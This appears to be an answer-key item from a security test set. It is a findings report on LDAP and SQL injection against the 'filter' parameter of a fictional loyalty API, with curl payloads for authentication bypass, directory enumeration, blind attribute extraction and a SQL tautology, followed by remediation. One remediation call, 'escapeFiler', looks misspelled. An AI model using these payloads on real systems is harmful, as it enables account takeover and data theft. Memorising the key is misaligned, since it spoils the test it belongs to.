# Expected Response

## System
- System: RewardCore Loyalty API v1.7.0
- Domain: RETAIL / LOYALTY PROGRAMME
- Example ID: INJ-0123
- Risk ID: RISK-INJ-123

## Findings

### 1. LDAP Injection on `/api/v3/orders?filter=` — Authentication Bypass + Member Enumeration (Primary)

The `filter` parameter on `GET /api/v3/orders` is interpolated directly into an LDAP search filter (`(&(objectClass=user)(cn=${filter}))`). An attacker can inject LDAP special characters to break out of the `cn=` attribute and inject additional filter conditions, bypassing loyalty member authentication and enumerating all directory accounts.

HAR shows `filter=admin)(&(password=*))` returning HTTP 200 with all loyalty member records including admin credentials. The HAR response shows SQL-structured records — both LDAP and SQL paths execute on the same endpoint (see Finding 2).

**Step 1 — Baseline:**
```bash
curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching loyalty orders only.

**Step 2 — LDAP authentication bypass: inject condition to match all passwords (primary HAR attack):**
```bash
curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=admin)(%26(password%3D*))" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
Injected LDAP filter: `(&(objectClass=user)(cn=admin)(&(password=*)))` — matches any admin account with any password.
**Vulnerable outcome:** Admin loyalty account credentials returned — LDAP authentication bypassed.

**Step 3 — LDAP wildcard: enumerate all loyalty programme members:**
```bash
curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=*)((objectClass%3D*)" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
Injected LDAP filter: `(&(objectClass=user)(cn=*)((objectClass=*)))` — wildcard matches all directory entries.
**Vulnerable outcome:** All loyalty programme member accounts listed — full directory enumeration.

**Step 4 — Blind LDAP injection: enumerate attribute values character by character:**
```bash
# Probe whether admin's email starts with 'a'
curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=admin)(mail%3Da*)" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** Non-empty response confirms email starts with `a` — blind LDAP attribute extraction without direct output.

### 2. SQL Injection on `/api/v3/orders?filter=` — Secondary (Legacy SQL Path, RISK-INJ-123)

HAR response shows SQL-structured records — legacy SQL path active on same endpoint.

**Step 5 — SQL tautology (legacy SQL path):**
```bash
curl -s "https://api.rewardcore-loya.example.com/api/v3/orders?filter=%27%20OR%201%3D1%20--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All loyalty order records returned.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- Escape LDAP special characters (`(`, `)`, `*`, `\`, `\0`) in `filter` before constructing the LDAP search filter (RISK-INJ-123). Use `ldapjs.escapeFiler()` or equivalent.
- Reject inputs containing LDAP metacharacters at the API layer.
- Replace legacy SQL string concatenation with parameterized queries.
- Restrict service account LDAP bind to minimum required attributes.
- Disable verbose error messages in production.
